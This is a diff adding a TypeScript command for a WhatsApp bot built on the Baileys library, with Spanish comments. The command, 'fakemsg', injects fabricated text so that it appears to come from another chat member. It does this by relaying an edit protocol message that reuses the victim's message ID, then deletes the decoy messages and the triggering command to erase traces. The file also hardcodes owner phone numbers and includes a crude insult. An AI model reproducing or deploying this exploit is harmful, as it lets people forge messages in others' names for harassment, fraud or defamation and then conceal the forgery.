@@ -1,0 +1,97 @@
+import { delay, WASocket, proto } from '@whiskeysockets/baileys';
+import { isOwnerOrSudo } from '../lib/isOwner';
+
+const fakemsgCommand = {
+    name: 'fakemsg',
+    aliases: ['fake', 'fmsg'],
+    category: 'owner',
+    desc: 'Inyecta un mensaje falso usando el exploit de edición cruzada.',
+
+    run: async (sock: WASocket, msg: proto.IWebMessageInfo, args: string[]) => {
+        try {
+            const chatId = msg.key.remoteJid || '';
+            const senderRaw = msg.key.participant || msg.key.remoteJid || '';
+            
+            // 1. BLINDAJE JID: Extraemos solo números (Ignora los @lid)
+            const senderDigits = senderRaw.replace(/\D/g, '');
+            const targetRaw = msg.message?.extendedTextMessage?.contextInfo?.participant || msg.quoted?.sender || '';
+            const targetDigits = targetRaw.replace(/\D/g, '');
+
+            const ownerNumbers = ['573118353868', '40763551416477'];
+            const isOwner = ownerNumbers.includes(senderDigits) || !!msg.key.fromMe;
+            
+            // Opcional: Usar tu función nativa si tienes más admins sudo
+            // const isAllowed = await isOwnerOrSudo(senderDigits, sock, chatId);
+
+            if (!isOwner) return true; // Si no eres tú, silencio absoluto.
+
+            // 2. DEFENSA PERSONAL
+            if (ownerNumbers.includes(targetDigits) && !msg.key.fromMe) {
+                await sock.sendMessage(chatId, { text: "¡Ni te atrevas a usar eso conmigo, vete a la verga! 😂" }, { quoted: msg });
+                await sock.sendMessage(chatId, { delete: msg.key }).catch(() => {});
+                return true;
+            }
+
+            // 3. VALIDACIONES
+            const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+            if (!quoted) {
+                await sock.sendMessage(chatId, { text: '❌ *Responde a un mensaje* para procesar el fake.' });
+                return true;
+            }
+
+            const text = args.join(' ').trim();
+            if (!text) return true;
+
+            const stanzaId = msg.message?.extendedTextMessage?.contextInfo?.stanzaId;
+            if (!stanzaId) return true;
+
+            // 4. EL EXPLOIT VISUAL (Tu método mejorado)
+            
+            // A) Mensaje señuelo invisible
+            const tempId = await sock.relayMessage(
+                chatId,
+                { extendedTextMessage: { text: '', contextInfo: { isGroupStatus: true } } },
+                { messageId: undefined }
+            );
+
+            // B) Inyección cruzada: Editamos el señuelo pero lo renderizamos sobre la víctima
+            const tempId2 = await sock.relayMessage(
+                chatId,
+                {
+                    protocolMessage: {
+                        key: { jid: chatId, fromMe: true, id: tempId },
+                        type: 14 as any, // 14 = Protocolo de Edición
+                        editedMessage: {
+                            extendedTextMessage: {
+                                text: text,
+                                contextInfo: { isGroupStatus: false }
+                            }
+                        }
+                    }
+                },
+                { messageId: stanzaId } // <--- Aquí ocurre la magia visual
+            );
+
+            await delay(100);
+
+            // 5. MODO FANTASMA: Borramos todo rastro
+            await Promise.allSettled([
+                sock.sendMessage(chatId, { delete: { remoteJid: chatId, id: tempId, fromMe: true } }),
+                sock.sendMessage(chatId, { delete: { remoteJid: chatId, id: tempId2, fromMe: true } }),
+                sock.sendMessage(chatId, { delete: msg.key }) // <--- ¡Adiós a tu comando ".fake"!
+            ]);
+
+            return true;
+
+        } catch (error: any) {
+            console.error('[CYRENE ERROR - FAKEMSG]', error);
+            const chatId = msg.key.remoteJid;
+            if (sock && chatId) {
+                await sock.sendMessage(chatId, { delete: msg.key }).catch(() => {}); // Si falla, al menos oculta tu error
+            }
+            return false;
+        }
+    }
+};
+
+export default fakemsgCommand;
